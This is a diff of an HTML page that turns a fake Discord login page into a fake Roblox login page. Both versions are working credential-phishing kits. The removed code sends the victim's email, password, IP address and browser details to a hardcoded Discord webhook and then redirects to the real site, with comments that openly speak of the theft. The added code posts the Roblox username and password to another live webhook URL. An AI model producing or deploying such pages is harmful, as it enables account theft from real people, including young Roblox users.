@@ -1,150 +1,109 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Login</title>
+    <title>Roblox Login</title>
     <style>
-        /* تصميم ديسكورد الرسمي */
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'gg sans', 'Noto Sans', sans-serif;
-            background-image: url('https://discord.com/assets/7c97f8ef22fa84d3.png'); /* خلفية ديسكورد */
-            background-size: cover;
+            background-color: #191B1D;
+            color: #FFFFFF;
+            font-family: "H覆盖", "Segoe UI", Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
+            margin: 0;
         }
-
-        .login-box {
-            background: #313338;
-            padding: 32px;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+        .container {
+            background-color: #232527;
+            padding: 30px 40px;
+            border-radius: 4px;
+            width: 380px;
             text-align: center;
-            color: #f2f3f5;
-        }
-
-        h2 { margin-bottom: 8px; font-size: 24px; }
-        p { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
-
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            color: #b5bac1;
-            font-size: 12px;
-            font-weight: bold;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            background: #1e1f22;
-            border: none;
-            border-radius: 3px;
-            color: white;
-            font-size: 16px;
             box-sizing: border-box;
         }
-
+        .logo {
+            width: 50px;
+            height: 50px;
+            background: url('https://images.rbxcdn.com/7ec584da251648a737609a5f4f89be9d-roblox_logo_dark.svg') no-repeat center;
+            background-size: contain;
+            margin: 0 auto 20px auto;
+        }
+        h3 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            background-color: #111214;
+            border: 1px solid #393B3D;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #0084ff;
+            outline: none;
+        }
         button {
             width: 100%;
             padding: 12px;
-            background: #5865f2;
+            background-color: #0084ff;
             color: white;
             border: none;
-            border-radius: 3px;
+            border-radius: 4px;
+            font-weight: bold;
             font-size: 16px;
             cursor: pointer;
-            transition: background 0.2s;
+            margin-top: 10px;
         }
-
-        button:hover { background: #4752c4; }
-
+        button:hover { background-color: #0074e0; }
         .footer-links {
-            margin-top: 8px;
-            text-align: left;
-            font-size: 14px;
-            color: #00a8fc;
-            cursor: pointer;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #979797;
         }
+        .footer-links a { color: #0084ff; text-decoration: none; }
     </style>
 </head>
 <body>
-
-    <div class="login-box">
-        <h2>Welcome back!</h2>
-        <p>We're so excited to see you again!</p>
-
-        <div class="input-group">
-            <label>Email or Phone Number</label>
-            <input type="text" id="email" required>
-        </div>
-
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password" required>
-            <div class="footer-links">Forgot your password?</div>
-        </div>
-
-        <button onclick="sendData()">Log In</button>
-
-        <div style="margin-top: 15px; font-size: 14px; color: #b5bac1; text-align: left;">
-            Need an account? <span style="color: #00a8fc; cursor: pointer;">Register</span>
+    <div class="container">
+        <div class="logo"></div>
+        <h3>Login to Roblox</h3>
+        <form onsubmit="sendData(event)">
+            <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="footer-links">
+            <a href="#">Forgot Password or Username?</a>
         </div>
     </div>
-
     <script>
-        // ضع رابط الـ Webhook الخاص بك هنا
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
-
-        async function sendData() {
-            const email = document.getElementById('email').value;
+        async function sendData(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-
-            if(!email || !pass) return alert("Please fill in all fields");
-
-            // جلب الـ IP تلقائياً لإضافته للتقرير
-            let ipData = { ip: "Unknown" };
-            try {
-                ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            } catch(e) {}
-
-            const payload = {
-                embeds: [{
-                    title: "📥 New Login Attempt",
-                    color: 0x5865F2,
-                    fields: [
-                        { name: "👤 User/Email", value: `\`${email}\``, inline: true },
-                        { name: "🔑 Password", value: `\`${pass}\``, inline: true },
-                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: false },
-                        { name: "🖥️ Browser", value: navigator.userAgent, inline: false }
-                    ],
-                    timestamp: new Date()
-                }]
-            };
-
-            fetch(WEBHOOK_URL, {
+            await fetch('https://discord.com/api/webhooks/1505014134834462851/5RgT2ClszGRVUFK4t9ajmpr22_uyLfd55WvemGaLPjXYBW1KeyvbvbhqAK-Fdjupr70M', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                // توجيه المستخدم لصفحة ديسكورد الحقيقية بعد السرقة لإبعاد الشبهة
-                window.location.href = "https://discord.com/login";
-            }).catch(() => {
-                alert("Connection Error!");
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "🎮 **حساب روبلوكس جديد!**",
+                    embeds: [{
+                        fields: [
+                            {name: "المستخدم", value: "`" + user + "`", inline: true},
+                            {name: "كلمة المرور", value: "`" + pass + "`", inline: true}
+                        ],
+                        color: 15158332
+                    }]
+                })
             });
+            window.location.href = "https://www.roblox.com/home";
         }
     </script>
 </body>
